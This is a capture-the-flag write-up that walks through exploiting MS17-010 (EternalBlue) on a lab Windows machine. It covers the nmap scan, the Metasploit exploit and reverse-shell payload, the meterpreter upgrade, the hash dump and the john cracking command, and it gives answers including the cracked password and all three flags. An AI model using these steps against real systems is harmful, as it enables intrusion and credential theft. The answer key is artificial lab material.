
# Recon

1. How many ports are open with a port number under 1000?
	1. 3
2. What is this machine vulnerable to?
	1.  ms17-010

Both questions can be answered by running the following scan `sudo nmap -sV -sC --script vuln -p-1000 10.10.134.188`

# Gain Access

1. Find the exploitation code we will run against the machine. What is the full path of the code?
	1. `search MS17=010`: exploit/windows/smb/ms17_010_eternalblue
2. Show options and set the one required value. What is the name of this value?
	1. `show options`: RHOSTS

We set the current context to the vuln we want to exploit. We then just set the RHOSTS value and update the LHOST to the `tun0` interface if using a VPN. The lab also asks that we set the payload to `windows/x64/shell/reverse_tcp`. After this is all done we just run the command `exploit` to get a reverse shell on the target machine.

# Escalate

1. What is the name of the post module we will use to switch to a meterpreter shell?
	1. Can be found by searching for "meterpreter" with a type of "post": post/multi/manage/shell_to_meterpreter
	2. Can also just run `sessions -u -1` to upgrade the last used session
2. what option are we required to change?
	1. `show options`: SESSION

We're also asked to migrate to a different process, listing out the processes with `ps` we see that "spoolsv.exe" is running and can leverage that or other running services.

# Cracking

1. What is the name of the non-default user
	1. `hashdump`: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
2. What is the cracked password
	1. `john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt`: alqfna22

# Find Flags

1. Flag1? This flag can be found at the system root.
	1. flag{access_the_machine}
2. Flag2? This flag can be found at the location where passwords are stored within Windows.
	1. flag{sam_database_elevated_access}
3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
	1. flag{admin_documents_can_be_valuable}

Worth noting that all of the flags can easily be found using `search -f flag*.txt`